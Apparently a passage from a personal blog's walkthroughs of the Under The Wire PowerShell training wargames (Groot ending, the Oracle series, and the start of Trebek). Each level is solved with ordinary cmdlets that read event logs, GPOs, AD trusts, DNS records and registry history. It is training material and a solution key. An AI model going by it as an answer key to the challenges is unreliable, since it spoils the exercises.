CompositionEditionID : ServerStandard CurrentBuild : 14393 CurrentBuildNumber : 14393 CurrentMajorVersionNumber : 10 CurrentMinorVersionNumber : 0 CurrentType : Multiprocessor Free CurrentVersion : 6.3 EditionID : ServerStandard InstallationType : Server InstallDate : 1533958991 ProductName : Windows Server 2016 Standard ReleaseId : 1607 SoftwareType : System UBR : 7876 PathName : C:\\Windows Customizations : None DigitalProductId : {164, 0, 0, 0...} DigitalProductId4 : {248, 4, 0, 0...} ProductId : 00377-60000-00000-AA934 InstallTime : 131784325915283879 RegisteredOwner : [REDACTED] RegisteredOrganization : OVH SAS PS C:\\users\\Groot13\\desktop\u0026gt; With that, we have our password.\nGroot level 14-15 # We are required to find the description of the share whose name contains “task” in it, then combine it with the name of the file on the desktop.\nThe password for groot15 is the description of the share whose name contains “task” in it PLUS the name of the file on the desktop. NOTE: – If the description is “frozen_pizza” and the file on the desktop is named “_sucks”, the password would be “frozen_pizza_sucks”. – The password will be lowercase no matter how it appears on the screen. Below is the name of the file on the desktop.\nPS C:\\users\\Groot14\\desktop\u0026gt; ls Directory: C:\\users\\Groot14\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 _8 PS C:\\users\\Groot14\\desktop\u0026gt; To find the description of the share, we shall use the command below.\nGet-SmbShare -Name \u0026#34;*task*\u0026#34; Here is what the command does.\nGet-SmbShare\nPowerShell cmdlet that retrieves Server Message Block (SMB) shares Part of the SmbShare module (available on Windows Server and Windows 10/11) Without parameters, lists all SMB shares on the computer Name \u0026quot;*task*\u0026quot;\nFilters shares to only those containing \u0026ldquo;task\u0026rdquo; in their name The asterisks () are wildcards meaning \u0026ldquo;any characters before/after \u0026rsquo;task'\u0026rdquo; Case-insensitive matching (will find \u0026ldquo;Task\u0026rdquo;, \u0026ldquo;TASK\u0026rdquo;, \u0026ldquo;MyTasks\u0026rdquo;, etc.) Below is the output of the command.\nPS C:\\users\\Groot14\\desktop\u0026gt; get-smbshare -name \u0026#34;*task*\u0026#34; Name ScopeName Path Description ---- --------- ---- ----------- Tasker * [REDACTED] PS C:\\users\\Groot14\\desktop\u0026gt; We now have the password for level 15.\nGroot level 15 # 😀 😊WE ARE DONE!!!\nCongratulations! You have successfully made it to the end! Try your luck with other games brought to you by the Under The Wire team. Thanks for playing! Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\Groot15\\desktop\u0026gt; :O :) ","date":"11 June 2025","externalUrl":null,"permalink":"/posts/groot/","section":"Posts","summary":"underthewire wargames groot series","title":"Underthewire groot war games","type":"posts"},{"content":" Oracle level 0-1 # The goal for this level is to log in to the first level via ssh using the creds provided to us in the Slack channel.\nThe goal of this level is to log into the game. Do the following in order to achieve this goal. 1. Obtain the initial credentials via the #StartHere channel on our Slack (link). Once you are in the channel, scroll to the top to see the credentials. 2. After obtaining the credentials, connect to the server via SSH. You will need an SSH client such as Putty. The host that you will be connecting to is oracle.underthewire.tech, on port 22. 3. When prompted, use the credentials for the applicable game found in the #StartHere Slack channel. 4. You have successfully connected to the game server when your path changes to “PS C:\\Users\\Oracle1\\desktop\u0026gt;”. With the credentials above, we are able to now log in as shown below.\nWindows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\Oracle1\\desktop\u0026gt; Oracle level 1-2 # For this challenge, we are required to find the timezone in which this system is set to.\nThe password for oracle2 is the timezone in which this system is set to. NOTE: – The password is the abbreviation of the timezone. For example, if it is listed as being in the Eastern timezone, the answer is est. – The password will be lowercase no matter how it appears on the screen. To check the time zone, we shall use the following command.\nGet-TimeZone This command retrives timezone details of the system. Below is the output of the command.\nPS C:\\users\\Oracle1\\desktop\u0026gt; get-timezone Id : [REDACTED] DisplayName : (UTC) Coordinated Universal Time StandardName : Coordinated Universal Time DaylightName : Coordinated Universal Time BaseUtcOffset : 00:00:00 SupportsDaylightSavingTime : False PS C:\\users\\Oracle1\\desktop\u0026gt; Oracle level 2-3 # For this level, we are required to get the md5 hash of the files on the desktop that have the same hash, then get the last 5 alphanumeric digits to use as the password for the next level.\nThe password for oracle3 is the last five digits of the MD5 hash, from the hashes of files on the desktop that appears twice. NOTE: – The password will be lowercase no matter how it appears on the screen. We shall use the command below to get the md5hash of the files then look which hashes are the same\net-ChildItem -File | Get-FileHash -Algorithm MD5 | Sort-Object Hash Get-ChildItem -File\nLists all items in the current directory File switch limits results to only files (excludes folders) Without parameters, would show both files and directories | Get-FileHash -Algorithm MD5\nPipes the files to the Get-FileHash cmdlet Calculates MD5 hash for each file Algorithm MD5 specifies the hash algorithm (alternatives include SHA1, SHA256, etc.) | Sort-Object Hash\nPipes the results to sort by the Hash property Arranges output in alphabetical/numerical order based on MD5 hash values Makes it easier to identify duplicate files (which will have identical hashes) Here is the output of the command.\nPS C:\\users\\Oracle2\\desktop\u0026gt; Get-ChildItem -File | Get-FileHash -Algorithm MD5 | Sort-Object Hash Algorithm Hash Path --------- ---- ---- MD5 0E848B375C2871DBFE0AD405B58BF4E2 C:\\users\\Oracle2\\desktop\\file19.txt MD5 1463397F8FDB4B99CDE3DB0B1E37EA6E C:\\users\\Oracle2\\desktop\\file11.txt MD5 1C579B4F21EB236E0CC7ABBB0313AE4C C:\\users\\Oracle2\\desktop\\file15.txt MD5 1E0054A7A7C6D8C820C7307F94513E50 C:\\users\\Oracle2\\desktop\\file21.txt MD5 226F590B023BF532FBEEB46154288644 C:\\users\\Oracle2\\desktop\\file10.txt MD5 3444EAB3BB3F80522031104151DAADA5 C:\\users\\Oracle2\\desktop\\file7.txt MD5 3705066150D7BF296F1E0F0EDC0DB9FA C:\\users\\Oracle2\\desktop\\file6.txt MD5 39A77E07A13922A8C971EB0BEEFFCEE3 C:\\users\\Oracle2\\desktop\\file8.txt MD5 3E00A2BF4B49C7D18DBA79DD39C4B19C C:\\users\\Oracle2\\desktop\\file18.txt MD5 41E65125606DE228B94CC2C97B401C1A C:\\users\\Oracle2\\desktop\\file20.txt MD5 4A22F5027B6E3C09C9743DB955B6878A C:\\users\\Oracle2\\desktop\\file2.txt MD5 4CEB4AAE0231B53834280CC5314FB932 C:\\users\\Oracle2\\desktop\\file1.txt MD5 5BE11FF0037EED156F77213658C2F5C4 C:\\users\\Oracle2\\desktop\\file16.txt MD5 5BE11FF0037EED156F77213658C2F5C4 C:\\users\\Oracle2\\desktop\\file.txt MD5 67CE823F3BCC2BCA22ADEB066160CF54 C:\\users\\Oracle2\\desktop\\file5.txt MD5 BA5DACAC4B8791D0A10C606C7DCCD10C C:\\users\\Oracle2\\desktop\\file14.txt MD5 C6DDC40861E16E60E924C34ED00F787B C:\\users\\Oracle2\\desktop\\file3.txt MD5 CABBDEAF260BF1FE922A8605D4DDD2BE C:\\users\\Oracle2\\desktop\\file9.txt MD5 F0483A1F2E8A20412DBBFC12F99C1193 C:\\users\\Oracle2\\desktop\\file12.txt MD5 FAB743AE9D2C15F5B84975A891133CCB C:\\users\\Oracle2\\desktop\\file13.txt MD5 FD74053193C5E5984E905FBDAD1D61BF C:\\users\\Oracle2\\desktop\\file17.txt MD5 FEB6246F13187BFBCA82EB9105B04B61 C:\\users\\Oracle2\\desktop\\file4.txt PS C:\\users\\Oracle2\\desktop\u0026gt; As seen above, we can now be able to identify the files with the same hash by looking through the hashes.\nOracle level 3-4 # The goal for this level is to go through the event logs and get the date which the event logs were last wiped.\nThe password for oracle4 is the date that the system logs were last wiped as depicted in the event logs on the desktop. NOTE: – The format for the password is 2 digit month, 2 digit day, 4 digit year. Ex: 5 Jan 2015 would be 01/05/2015. For easier identification, we can search for the event id that signifies when audit logs were cleared.\nWith this information, we can now search for the event ID and get the date using the command below.\nGet-WinEvent -Path .\\Oracle3_Security.evtx | where-object {$_.Id -Eq 1102} Get-WinEvent -Path .\\Oracle3_Security.evtx\nReads events from an exported Windows Event Log file named \u0026ldquo;Oracle3_Security.evtx\u0026rdquo; .evtx is the standard extension for Windows Event Log files The file is located in the current working directory (.\\) | Where-Object {$_.Id -Eq 1102}\nFilters the events to only show those with Event ID 1102 $_.Id refers to the EventID property of each log entry Eq is the equality comparison operator Here is the output of the command\nPS C:\\users\\Oracle3\\desktop\u0026gt; Get-WinEvent -Path .\\Oracle3_Security.evtx | where-object {$_.Id -Eq 1102} ProviderName: Microsoft-Windows-Eventlog TimeCreated Id LevelDisplayName Message ----------- -- ---------------- ------- [REDACTED] 11:36:05 PM 1102 Information The audit log w... PS C:\\users\\Oracle3\\desktop\u0026gt; With that, we now have the password for our newt level.\nOracle level 4-5 # For this challenge, we need to find the name of the GPO(Group policy object) that was last created then we combine it with the name of the file on the desktop to get the password for level 5\nThe password for oracle5 is the name of the GPO that was last created PLUS the name of the file on the user’s desktop. NOTE: – If the GPO name is “blob” and the file on the desktop is named “1234”, the password would be “blob1234”. – The password will be lowercase no matter how it appears on the scree Below is the listing of the file on the desktop.\nPS C:\\users\\Oracle4\\desktop\u0026gt; ls Directory: C:\\users\\Oracle4\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:49 AM 0 83 PS C:\\users\\Oracle4\\desktop\u0026gt; To find the name of the GPO that was last created, we shall use the following commands.\nget-gpo -all | sort-object CreationTime -descending | select-object -first 1 Get-GPO -All\nRetrieves all Group Policy Objects (GPOs) in the Active Directory domain The All parameter ensures all GPOs are returned, including unlinked ones Without parameters, it would only return GPOs in the current domain | Sort-Object CreationTime -Descending\nPipes the GPOs to be sorted by their creation timestamp Descending sorts from newest to oldest This puts the most recently created GPO at the top of the list | Select-Object -First 1\nSelects only the first (top) item from the sorted list This gives us the single most recently created GPO Here is the output of the command.\nPS C:\\users\\Oracle4\\desktop\u0026gt; get-gpo -all | sort-object CreationTime -d escending | select-object -first 1 DisplayName : [REDACTED] DomainName : underthewire.tech Owner : underthewire\\Domain Admins Id : 49401c32-4145-463f-b5e7-816926d4f78d GpoStatus : AllSettingsEnabled Description : Are you there? CreationTime : 1/13/2019 9:40:20 PM ModificationTime : 1/13/2019 9:40:20 PM UserVersion : AD Version: 0, SysVol Version: 0 ComputerVersion : AD Version: 0, SysVol Version: 0 WmiFilter : PS C:\\users\\Oracle4\\desktop\u0026gt; With that, we now have the password for our next level.\nOracle level 5-6 # For this level, we are required to find the GPO with the description I_AM_oracle and combine it with the name of the file on the desktop\nThe password for oracle6 is the name of the GPO that contains a description of “I_AM_GROOT” PLUS the name of the file on the user’s desktop. NOTE: – If you are using SSH, you MUST do a Help on the cmdlet needed to solve this. For example, if the cmdlet is “get-something” type “help get-something” first, this will make the cmdlet available for you to use. This is a bug in the SSH software used. – If the GPO description is “blob” and the file on the desktop is named “1234”, the password would be “blob1234”. – The password will be lowercase no matter how it appears on the screen. The file on the desktop is as shown below.\nPS C:\\users\\Oracle5\\desktop\u0026gt; ls Directory: C:\\users\\Oracle5\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:50 AM 0 1337 PS C:\\users\\Oracle5\\desktop\u0026gt; To get the GPO, we shall use the following command as shown below.\nget-gpo -all | where-object {$_.Description -eq \u0026#34;I_AM_GROOT\u0026#34;} Get-GPO -All\nRetrieves all Group Policy Objects in the Active Directory domain The All parameter ensures it returns every GPO, including: Linked and unlinked GPOs Enabled and disabled GPOs GPOs in all domains (if run in a forest with multiple domains) | Where-Object {$_.Description -eq \u0026quot;I_AM_GROOT\u0026quot;}\nFilters the GPOs to only those with an exact description match to \u0026ldquo;I_AM_GROOT\u0026rdquo; $_.Description accesses the Description property of each GPO eq performs an exact case-sensitive comparison Here is the command output.\nPS C:\\users\\Oracle5\\desktop\u0026gt; get-gpo -all | where-object {$_.Descriptio n -eq \u0026#34;I_AM_GROOT\u0026#34;} DisplayName :[REDACTED] DomainName : underthewire.tech Owner : underthewire\\Domain Admins Id : 44080cf1-1053-467d-b000-2ea3f27dbbfa GpoStatus : AllSettingsEnabled Description : I_am_Groot CreationTime : 11/20/2018 12:18:09 AM ModificationTime : 11/20/2018 12:18:08 AM UserVersion : AD Version: 0, SysVol Version: 0 ComputerVersion : AD Version: 0, SysVol Version: 0 WmiFilter : PS C:\\users\\Oracle5\\desktop\u0026gt; Oracle level 6-7 # Below is the description of the challenge.\nThe password for oracle7 is the name of the OU that doesn’t have a GPO linked to it PLUS the name of the file on the user’s desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. – Exclude the “Groups” OU. Below is the file on the desktop.\nPS C:\\users\\Oracle6\\desktop\u0026gt; ls Directory: C:\\users\\Oracle6\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:50 AM 0 _97 PS C:\\users\\Oracle6\\desktop\u0026gt; To get the name of the OU that does not have a GPO linked to it, we shall use the command below.\nget-adorganizationalunit -filter * | where -object {-not $_.LinkedGroupPolicyObjects} Get-ADOrganizationalUnit -Filter *\nRetrieves all Organizational Units from Active Directory Filter * means \u0026ldquo;no filter\u0026rdquo; (get all OUs) Without this, it would only return a default set of properties | Where-Object {-not $_.LinkedGroupPolicyObjects}\nFilters the OUs to only show those without linked GPOs $_.LinkedGroupPolicyObjects checks the LinkedGroupPolicyObjects property not returns OUs where this property is empty/null The property normally contains Distinguished Names of linked GPOs Here is the output of the command\nPS C:\\users\\Oracle6\\desktop\u0026gt; get-adorganizationalunit -filter * | where -object {-not $_.LinkedGroupPolicyObjects} City : Country : DistinguishedName : OU=T-50,OU=X-Wing,DC=underthewire,DC=tech LinkedGroupPolicyObjects : {} ManagedBy : Name : [REDACTED] ObjectClass : organizationalUnit ObjectGUID : 5ace8bef-c00e-4f58-a543-3fd45436f1d4 PostalCode : State : StreetAddress : City : Country : DistinguishedName : OU=Groups,DC=underthewire,DC=tech LinkedGroupPolicyObjects : {} ManagedBy : Name : Groups ObjectClass : organizationalUnit ObjectGUID : bf366f71-f291-43ca-8334-cdb18890e332 PostalCode : State : StreetAddress : PS C:\\users\\Oracle6\\desktop\u0026gt; With that, we have the password to the next level.\nOracle level 7-8 # To find the password for the next level, we need to find the name of the domain, where trust is built, then combine it with the name of the file that is on the desktop.\nThe password for oracle8 is the name of the domain that a trust is built with PLUS the name of the file on the user’s desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. – If the name of the trust is “blob” and the file on the desktop is named “1234”, the password would be “blob1234”. Below is the name of the file that is on the desktop.\nPS C:\\users\\Oracle7\\desktop\u0026gt; ls Directory: C:\\users\\Oracle7\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:50 AM 0 111 PS C:\\users\\Oracle7\\desktop\u0026gt; To find the name of the domain that has trust built in it, we shall use the following command.\nget-adtrust -filter * Get-ADTrust\nThe cmdlet that retrieves Active Directory trust objects Part of the Active Directory module (requires RSAT tools on workstations) -Filter *\nReturns all trust relationships (no filtering) The asterisk () is a wildcard meaning \u0026ldquo;match everything\u0026rdquo; Here is the output of the command.\nPS C:\\users\\Oracle7\\desktop\u0026gt; get-adtrust -filter * Direction : Outbound DisallowTransivity : True DistinguishedName : CN=multiverse,CN=System,DC=underthewire,DC=t ech ForestTransitive : False IntraForest : False IsTreeParent : False IsTreeRoot : False Name : [REDACTED] ObjectClass : trustedDomain ObjectGUID : bbfcc0ca-e586-4058-9aef-c6b4a6b32708 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=underthewire,DC=tech Target : multiverse TGTDelegation : False TrustAttributes : 1 TrustedPolicy : TrustingPolicy : TrustType : MIT UplevelOnly : False UsesAESKeys : False UsesRC4Encryption : False PS C:\\users\\Oracle7\\desktop\u0026gt; Oracle level 8-9 # Below is the objective of the challenge.\nThe password for oracle9 is the name of the file in the GET Request from www.guardian.galaxy.com within the log file on the desktop. NOTE: – Don’t include the extension. – The password will be lowercase no matter how it appears on the screen. As described above, we are required to get the name of the file in the GET request form www.guardian.galaxy.com within the log file on the desktop.\nTo get the file, we shall use the following command.\ntype .\\logs.txt | out-string -stream | select-string -patern \u0026#34;guardian\u0026#34; type .\\logs.txt\nThis displays the contents of the logs.txt file located in the current directory (.\\). Equivalent to Get-Content .\\logs.txt. | out-string -stream\nThis takes the output of type and converts each line to a string object without merging the lines into one block (thanks to stream). Useful for ensuring that Select-String receives clean line-by-line string input, especially when previous commands might output objects. | select-string -pattern \u0026quot;guardian\u0026quot;\nThis searches each line of the text for the pattern \u0026ldquo;guardian\u0026rdquo; (case-insensitive by default unless CaseSensitive is added). Returns the line(s) that match, highlighting the matching word. Here is the output of the command\nPS C:\\users\\Oracle8\\desktop\u0026gt; type .\\logs.txt | out-string -stream | sele ct-string -pattern \u0026#34;guardian\u0026#34; guardian.galaxy.com - - [28/Jul/1995:13:03:55 -0400] \u0026#34;GET /images/[REDACTED].gif HTTP/1.0\u0026#34; 200 786 PS C:\\users\\Oracle8\\desktop\u0026gt; Oracle level 9-10 # Below is the objective and description of the challenge.\nThe password for oracle10 is the computer name of the DNS record of the mail server listed in the UnderTheWire.tech zone PLUS the name of the file on the user’s desktop. NOTE: – If the server name is “some_blob” and the file on the desktop is named “1234”, the password would be “some_blob1234”. – Only submit the computer name and not the fully qualified domain name. – The password will be lowercase no matter how it appears on the screen. Below is the file located on the desktop of the user oracle9\nPS C:\\users\\Oracle9\\desktop\u0026gt; ls Directory: C:\\users\\Oracle9\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 9229 To find the computer name of the DNS record of the mail server listed in the Underthewire,tech zone, we shall use the command below.\nget-dnsserverresourcerecord -zonename \u0026#39;und erthewire.tech\u0026#39; Get-DnsServerResourceRecord:\nThis PowerShell cmdlet is part of the DnsServer module and is used to get all or specific DNS records from a DNS server for a given zone. ZoneName 'underthewire.tech':\nSpecifies the DNS zone from which to retrieve the records. In this case, it\u0026rsquo;s querying the underthewire.tech DNS zone. Here is the command output.\nPS C:\\users\\Oracle9\\desktop\u0026gt; get-dnsserverresourcerecord -zonename \u0026#39;und erthewire.tech\u0026#39; HostName RecordType Type Timestamp T i m e T o L i v e -------- ---------- ---- --------- - @ A 1 4/25/2025 4:00:00 AM 0 @ NS 2 0 0 @ SOA 6 0 0 _msdcs NS 2 0 0 _gc._tcp.Default-First... SRV 33 4/25/2025 2:00:00 AM 0 _kerberos._tcp.Default... SRV 33 4/25/2025 2:00:00 AM 0 _ldap._tcp.Default-Fir... SRV 33 4/25/2025 3:00:00 AM 0 _gc._tcp SRV 33 4/25/2025 2:00:00 AM 0 _kerberos._tcp SRV 33 4/25/2025 4:00:00 AM 0 _kpasswd._tcp SRV 33 4/25/2025 2:00:00 AM 0 _ldap._tcp SRV 33 4/25/2025 3:00:00 AM 0 _kerberos._udp SRV 33 4/25/2025 2:00:00 AM 0 _kpasswd._udp SRV 33 4/25/2025 2:00:00 AM 0 CYBORG718W100N A 1 0 0 DomainDnsZones A 1 4/25/2025 2:00:00 AM 0 _ldap._tcp.Default-Fir... SRV 33 4/25/2025 2:00:00 AM 0 _ldap._tcp.DomainDnsZones SRV 33 4/25/2025 2:00:00 AM 0 ForestDnsZones A 1 4/25/2025 2:00:00 AM 0 _ldap._tcp.Default-Fir... SRV 33 4/25/2025 2:00:00 AM 0 _ldap._tcp.ForestDnsZones SRV 33 4/25/2025 2:00:00 AM 0 utw A 1 0 0 [REDACTED] MX 15 0 0 PS C:\\users\\Oracle9\\desktop\u0026gt; From the above output, we need to check the mx record to find the computer name of the mail server.\nOracle level 10-11 # For this level, we are required to find the site that the user last visited that ends with .biz\nThe password for oracle11 is the .biz site the user has previously navigated to. NOTE: – Don’t include the extension. – The password will be lowercase no matter how it appears on the screen. For this case, we need to check the registry key for TypedURLs since this registry stores Internet Explorer’s cached history and is very valuable in forensics investigations.\nWe shall use the following command.\nget-itemproperty -Path \u0026#34;HKCU:\\Software\\Mi crosoft\\Internet Explorer\\TypedURLs\u0026#34; Get-ItemProperty:\nA PowerShell cmdlet used to get the properties (i.e., name–value pairs) of a registry key or file system item. -Path \u0026quot;HKCU:\\Software\\Microsoft\\Internet Explorer\\TypedURLs\u0026quot;:\nSpecifies the registry path to the TypedURLs key, which is found under: Here is the output of the command.\nPS C:\\users\\Oracle10\\desktop\u0026gt; get-itemproperty -Path \u0026#34;HKCU:\\Software\\Mi crosoft\\Internet Explorer\\TypedURLs\u0026#34; url1 : http://go.microsoft.com/fwlink/p/?LinkId=255141 url2 : http://google.com url3 : http://underthewire.tech url4 : http://bimmerfest.com url5 : http://nba.com url6 : http://[REDACTED].biz url7 : http://hardknocks.edu url8 : http://installation.org PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\S oftware\\Microsoft\\Internet Explorer\\TypedURLs PSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\S oftware\\Microsoft\\Internet Explorer PSChildName : TypedURLs PSDrive : HKCU PSProvider : Microsoft.PowerShell.Core\\Registry PS C:\\users\\Oracle10\\desktop\u0026gt; Oracle level 11-12 # The password for the next level, we are told that the letter associated with the mapped driver that user oracle11 has.\nThe password for oracle12 is the drive letter associated with the mapped drive that this user has. NOTE: – Submission should be one letter and lowercase. To get the drive letter, we shall use the command below.\nget-smbmapping Get-SmbMapping displays active SMB (Server Message Block) network share mappings on the local machine.\nIn simpler terms, it shows which network folders (shared drives) are currently connected/mapped via SMB — the protocol used for Windows file sharing.\nHere is the output of the command.\nPS C:\\users\\Oracle11\\desktop\u0026gt; get-smbmapping Status Local Path Remote Path ------ ---------- ----------- Unavailable [REDACTED] \\\\127.0.0.1\\WsusContent PS C:\\users\\Oracle11\\desktop\u0026gt; Oracle level 12-13 # For this level, we are required to find the IP of the system that user oracle12 has established remote desktop with.\nThe password for oracle13 is the IP of the system that this user has previously established a remote desktop with. For this challenge, we need to check the terminal server client registry to find the IP. We shall use the command below.\nget-childitem -Path \u0026#34;HKCU:\\Software\\Micro soft\\Terminal Server Client\u0026#34; Get-ChildItem:\nThis cmdlet is like ls or dir — it lists items (in this case, registry keys) at a specified path. Path \u0026quot;HKCU:\\Software\\Microsoft\\Terminal Server Client\u0026quot;:\nSpecifies the registry location in the HKEY_CURRENT_USER (HKCU) hive.\nThis particular path stores information related to the Remote Desktop Client (mstsc.exe), such as:\nRecently connected IPs or hostnames Connection bar settings Display preferences Here is the command output.\nPS C:\\users\\oracle12\\desktop\u0026gt; get-childitem -Path \u0026#34;HKCU:\\Software\\Micro soft\\Terminal Server Client\u0026#34; Hive: HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client Name Property ---- -------- [REDACTED] UsernameHint : MyServer\\raccoon PS C:\\users\\oracle12\\desktop\u0026gt; Oracle level 13-14 # As described below, is the objective of the challenge.\nThe password for oracle14 is the name of the user who created the Galaxy security group as depicted in the event logs on the desktop PLUS the name of the text file on the user’s desktop. NOTE: – If the user’s name is “randy” and the file on the desktop is named “1234”, the password would be “randy1234”. – The password will be lowercase no matter how it appears on the screen. We need to find the name of the user who created the galaxy security group then combine it with the name of the text file on the user’s desktop.\nBelow is the name of the file.\nPS C:\\users\\Oracle13\\desktop\u0026gt; ls Directory: C:\\users\\Oracle13\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 88 -a---- 8/30/2018 5:52 AM 2166784 security.evtx PS C:\\users\\Oracle13\\desktop\u0026gt; To find the name of the user, we shall use the following command.\nGet-WinEvent -Path .\\security.evtx | Where-Object {$_.Message -like \u0026#39;*group*created*\u0026#39;} | Select-Object -ExpandProperty Message Get-WinEvent -Path .\\security.evtx\nReads a saved event log file named security.evtx from the current directory (.\\). Get-WinEvent is used for reading event logs — either from live system logs or .evtx log files. This pulls in all events from that log file. | Where-Object {$_.Message -like '*group*created*'}\nFilters the events where the Message property (the human-readable explanation of the event) contains both \u0026ldquo;group\u0026rdquo; and \u0026ldquo;created\u0026rdquo; in that order. The like operator uses wildcards (), so this matches any string that includes \u0026ldquo;group\u0026rdquo;, followed at some point by \u0026ldquo;created\u0026rdquo;. Example match: \u0026quot;A security-enabled local group was created.\u0026quot; | Select-Object -ExpandProperty Message\nInstead of returning the full event object, this pulls out just the Message field. ExpandProperty unwraps it to plain strings (not objects). Here is the output of the command.\nPS C:\\users\\Oracle13\\desktop\u0026gt; Get-WinEvent -Path .\\security.evtx | Wher e-Object {$_.Message -like \u0026#39;*group*created*\u0026#39;} | Select-Object -ExpandPr operty Message A security-enabled global group was created. Subject: Security ID: S-1-5-21-2268727836-2773903800-29522480 01-1621 Account Name: [REDACTED] Account Domain: UNDERTHEWIRE Logon ID: 0xBC24FF New Group: Security ID: S-1-5-21-2268727836-2773903800-29522480 01-1626 Group Name: Galaxy Group Domain: UNDERTHEWIRE Attributes: SAM Account Name: Galaxy SID History: - Additional Information: Privileges: - A security-enabled global group was created. Subject: Security ID: S-1-5-21-2268727836-2773903800-29522480 01-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0xB6B6FE New Group: Security ID: S-1-5-21-2268727836-2773903800-29522480 01-1625 Group Name: Guardian Group Domain: UNDERTHEWIRE Attributes: SAM Account Name: Guardian SID History: - Additional Information: Privileges: - PS C:\\users\\Oracle13\\desktop\u0026gt; Oracle level 14-15 # Below is a description and objective of the challenge.\nThe password for oracle15 is the name of the user who added the user Bereet to the Galaxy security group as depicted in the event logs on the desktop PLUS the name of the text file on the user’s desktop. NOTE: – If the script name is “randy” and the file on the desktop is named “1234”, the password would be “randy1234”. – The password will be lowercase no matter how it appears on the screen. For this challenge, we need to find the name of the user who added the user Bereet to the Galaxy security group then combine it with the name of the file on the desktop.\nThe password for oracle15 is the name of the user who added the user Bereet to the Galaxy security group as depicted in the event logs on the desktop PLUS the name of the text file on the user’s desktop. NOTE: – If the script name is “randy” and the file on the desktop is named “1234”, the password would be “randy1234”. – The password will be lowercase no matter how it appears on the sc Below is the file located on the desktop.\nPS C:\\users\\Oracle14\\desktop\u0026gt; ls Directory: C:\\users\\Oracle14\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:51 AM 0 2112 -a---- 8/30/2018 5:52 AM 2166784 security.evtx PS C:\\users\\Oracle14\\desktop\u0026gt; To find the name of the user who added the user, we have two event IDs that are of interest to us 632 and 4728. With this two events in mind, we shall use the command below to find our user.\nGet-WinEvent -Path ..\\Desktop\\Security.evtx | where {$_.Id -Eq 632 -OR $_.Id -Eq 4728} | Format-List -Property Message | Out-String -Stream | Select-String -Pattern \u0026#34;Bereet\u0026#34; -Context 8,1 Get-WinEvent -Path ..\\Desktop\\Security.evtx\nLoads a saved Windows Security Event Log file named Security.evtx located on the desktop of the parent directory (..). Pulls all events from the file. where {$*.Id -eq 632 -or $*.Id -eq 4728}\nFilters events to include only those with Event ID 632 or 4728. 632 (Legacy): A user was added to a group. 4728: A user was added to a privileged group (e.g., Administrators, Domain Admins). This step focuses on group membership modifications. Format-List -Property Message\nFormats each event to only show the Message field in list format (each property on its own line). This is useful for readable, line-by-line text processing. Out-String -Stream\nConverts the formatted output to a stream of plain strings (one per line). This makes it possible to process it with Select-String. Select-String -Pattern \u0026quot;Bereet\u0026quot; -Context 8,1\nSearches for lines that contain the word \u0026quot;Bereet\u0026quot;. Context 8,1: Shows 8 lines before and 1 line after each match, giving you useful context around where \u0026quot;Bereet\u0026quot; appears. Here is the output of the command.\nPS C:\\users\\Oracle14\\desktop\u0026gt; Get-WinEvent -Path ..\\Desktop\\Security.ev tx | where {$_.Id -Eq 632 -OR $_.Id -Eq 4728} | Format-List -Property M essage | Out-String -Stream | Select-String -Pattern \u0026#34;Bereet\u0026#34; -Context 8,1 S-1-5-21-2268727836-2773903800-2952248001-1622 Account Name: [REDACTED] Account Domain: UNDERTHEWIRE Logon ID: 0xBD8CC7 Member: Security ID: S-1-5-21-2268727836-2773903800-2952248001-1623 \u0026gt; Account Name: CN=Bereet,OU=Morag,DC=UNDERTHEW IRE,DC=TECH PS C:\\users\\Oracle14\\desktop\u0026gt; With that we have our password for level 15.\nOracle level 15 # We are done.\nCongratulations! You have successfully made it to the end! Try your luck with other games brought to you by the Under The Wire team. Thanks for playing! Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\Oracle15\\desktop\u0026gt; :) :o ","date":"11 June 2025","externalUrl":null,"permalink":"/posts/oracle/","section":"Posts","summary":"underthewire wargames oracle series","title":"Underthewire oracle war games","type":"posts"},{"content":" Trebek level 0-1 # The goal for this level is to log in to the first level via ssh using the creds provided to us in the Slack channel.\nThe goal of this level is to log into the game. Do the following in order to achieve this goal. 1. Obtain the initial credentials via the #StartHere channel on our Slack (Link). Once you are in the channel, scroll to the top to see the credentials. 2. After obtaining the credentials, connect to the server via SSH. You will need an SSH client such as Putty. The host that you will be connecting to is trebek.underthewire.tech, on port 22. 3. When prompted, use the credentials for the applicable game found in the #StartHere Slack channel. 4. You have successfully connected to the game server when your path changes to “PS C:\\Users\\Trebek1\\desktop\u0026gt;”. With the credentials above, we are able to now log in as shown below.\nWindows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\trebek1\\desktop\u0026gt; Trebek level 1-2 # For this challenge, we need to find the name of the deleted script referenced in a deleted task.\nThe password for trebek2 is the name of the script referenced in a deleted task as depicted in the event logs on the desktop. NOTE: – Don’t include the file extension (i.e.- .vbs) – The password will be lowercase no matter how it appears on the screen. For this task, we need to find the event ID that is generated when deleting a scheduled task, from this link, we find our event ID to be 4699.\nTo achieve this, we shall first start by doing the following.\n$evt = Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026#34;*[System[EventID=4699]]\u0026#34; 